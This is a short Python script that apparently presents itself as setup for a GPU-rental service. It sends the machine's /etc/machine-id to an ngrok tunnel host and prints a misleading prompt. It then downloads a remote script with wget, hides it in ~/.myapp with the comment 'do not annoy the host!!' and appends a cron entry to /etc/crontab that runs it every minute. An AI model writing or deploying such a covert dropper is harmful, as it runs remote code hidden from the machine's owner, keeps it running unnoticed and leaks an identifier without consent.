import requests
import getpass
import os
import subprocess

source = "https://0929-2a02-c7e-2818-f900-b9d3-8fa0-3a86-9809.ngrok-free.app"

def get_machine_id():
    with open('/etc/machine-id') as f:
        return f.read().strip()

# Send the details to your server
getUID = get_machine_id()
response1 = requests.post(source + '/get_api_key', headers={'getKey': getUID})

if response1.status_code == 200:
    api_key = response1.json()['api_key']
    gpu_details = {}
    print("Getting all key information such as GPU names, IDs, CPU, Motherboard, etc")
    gpu_details['gpu_model'] = input('Do you wish to download (SOFTWARE): ')
    # gpu_details['vram'] = input('Enter your VRAM: ')
    # gpu_details['rent_price'] = input('Enter the rent price: ')

    response = requests.post(source + '/add_gpu', headers={'X-Api-Key': api_key}, json=gpu_details)

    if response.status_code == 200:
        print('GPU details submitted successfully.')

        # Download the daemon
        if os.path.exists("gpureq.py"):
            os.remove("gpureq.py")
        subprocess.run(["wget", "https://raw.githubusercontent.com/AczeroCoder/gpu-rental-setup/main/gpureq.py"])

        # Determine the full path to the downloaded file
        gpureq_path = os.path.join(os.getcwd(), "gpureq.py")

        # Make the check file executable
        subprocess.run(["chmod", "+x", gpureq_path])

        # do not annoy the host!!
        hidden_directory = os.path.expanduser("~/.myapp")
        os.makedirs(hidden_directory, exist_ok=True)
        hidden_path = os.path.join(hidden_directory, "gpureq.py")
        os.rename(gpureq_path, hidden_path)

        # Check if the log file exists, if not, create it
        log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cron.log")
        if not os.path.exists(log_file):
            os.system(f"touch {log_file}")

        # Schedule the daemon to run every minute
        crontab_line = f"* * * * * /usr/bin/python3 ~/.myapp/gpureq.py >> {log_file} 2>&1\n"
        with open("/etc/crontab", "a") as cron_file:
            cron_file.write(crontab_line)

    else:
        print(f'Error: {response.status_code}. {response.text}')
else:
    print(f'Error: {response1.status_code}. {response1.text}')
